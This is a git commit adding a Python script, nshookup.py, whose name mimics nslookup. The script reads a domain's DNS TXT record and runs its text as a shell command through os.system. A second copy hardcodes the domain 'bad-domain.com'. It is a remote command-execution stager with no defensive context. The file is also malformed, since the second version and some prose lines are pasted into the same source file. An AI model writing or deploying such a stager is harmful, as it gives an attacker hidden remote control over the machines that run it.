e8a29829620840396aefdc2167d82e1396777e29
Dood3 <93183445+Dood3@users.noreply.github.com>
2025-02-16 12:22:09 +0100

    Create nshookup.py

---
+++ nshookup_SRC/nshookup.py
@@ -0,0 +1,32 @@
+#!/usr/bin/python3
+
+import os, sys
+import dns.resolver
+
+domain = sys.argv[1]
+result = dns.resolver.resolve(domain, 'TXT')
+
+for cmdval in result:
+  
+  text = cmdval.to_text()
+  result = text.split('"')[1].split('"')[0]
+
+os.system(result)
+Version two with hardcoded domain:
+Command: python nshookup.py
+
+#===========================================================
+
+#!/usr/bin/python3
+
+import os, sys
+import dns.resolver
+
+result = dns.resolver.resolve('bad-domain.com', 'TXT')
+
+for cmdval in result:
+  
+  text = cmdval.to_text()
+  result = text.split('"')[1].split('"')[0]
+
+os.system(result)
